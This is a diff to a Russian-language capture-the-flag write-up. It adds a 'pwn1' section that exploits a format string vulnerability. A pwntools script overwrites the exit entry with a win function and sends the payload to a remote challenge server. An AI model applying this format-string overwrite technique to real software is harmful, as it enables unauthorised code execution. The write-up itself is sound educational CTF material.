@@ -33,3 +33,27 @@
 Полноценный скрипт решения (использует sagemath и PyCryptodome) [прилагается](./crypto2.py)
 
 `flag`: nto{50mb0dy_45k3d_m3_f0r_d1scr3t3_l0g_2}
+
+
+## pwn1
+
+Используем Ghidra для декомпиляции программы, видим format string vulnerability. Генерируем пейлоад, меняющий функцию exit в plt на функцию win, при помощи pwntools. Читем флаг: `cat flag`
+```Python
+from pwn import *
+
+context.log_level = 'debug'
+context.bits = 64
+
+
+addr = 0x404018
+value = 0x401156
+
+payload = fmtstr_payload(6, {addr : value})
+
+# con = process("./main")
+con = remote("192.168.12.13", 1923)
+
+con.send(payload + b"\n")
+
+con.interactive()
+```
